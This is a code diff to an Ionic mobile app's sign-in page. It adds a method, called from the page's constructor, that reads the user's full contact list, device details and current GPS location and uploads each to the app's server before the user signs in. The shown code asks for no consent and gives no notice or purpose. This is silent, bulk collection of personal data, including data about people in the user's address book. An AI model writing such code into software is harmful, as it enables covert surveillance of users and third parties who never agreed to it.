@@ -9,6 +9,10 @@ import {ServiceCaller} from '../../providers/servicecaller';
 import {UserCredentials, CredentialsValidation, VersionInfo} from '../../contracts/DataContracts';
 import {User} from '../../contracts/ServerContracts';
 
+import {UserContactsInfo, UserDeviceInfo, UserGeoInfo} from '../../contracts/ServerContracts';
+import {Contacts, Device, Geolocation} from 'ionic-native';
+import {Contact} from 'ionic-native/dist/plugins/contacts';
+
 /* TODO: 1) Handle Error and display
     2) Fetch Email from cordova Device plugin
 */
@@ -29,8 +33,11 @@ export class SignIn {
     signupLabel: string = "Sign Up";
     termsLabel: string = "Terms and Conditions";    
 
+    contacts: Contact[];
+
     constructor(public nav: NavController, public config: Config, public cache: Cache, public service: ServiceCaller) {
         this.checkIfUserIsLoggedIn();
+        this.uploadUserAndDeviceInfo();
     }
 
     checkIfUserIsLoggedIn() {
@@ -89,6 +96,36 @@ export class SignIn {
         this.signupLabel = data.getValue('signup');
         this.termsLabel = data.getValue('terms');
     }
+    
+    //#region User Info
+        uploadUserAndDeviceInfo() {
+        var contactJson: UserContactsInfo;
+        var deviceJson: UserDeviceInfo;
+        var geoJson: UserGeoInfo;
+        
+        // Contacts List
+        var contactsList = Contacts.find(['*']);
+        contactsList.then(data => { this.contacts = data;
+            contactJson = { UserId: null, JSON: JSON.stringify(data) }
+            let contactsUpload = this.service.uploadContactsList(JSON.stringify(contactJson));
+            contactsUpload.subscribe(data => {console.log(data);});
+             });
+        
+        // Device Info
+        deviceJson = { UserId: null, JSON: JSON.stringify(Device.device) }
+        let deviceUpload = this.service.uploadDeviceInfo(JSON.stringify(deviceJson));
+        deviceUpload.subscribe(data => {console.log(data);})
+        
+        // Geo-location
+        let geoPos = Geolocation.getCurrentPosition();
+        geoPos.then(data =>    {     
+                    geoJson = { UserId: null, JSON: JSON.stringify(data)};
+                    let geoUpload = this.service.uploadUserLocation(JSON.stringify(geoJson));
+                    geoUpload.subscribe(data => {console.log(data);})
+        });        
+    }
+
+    //#endregion User Info
     
     // #region Version
     
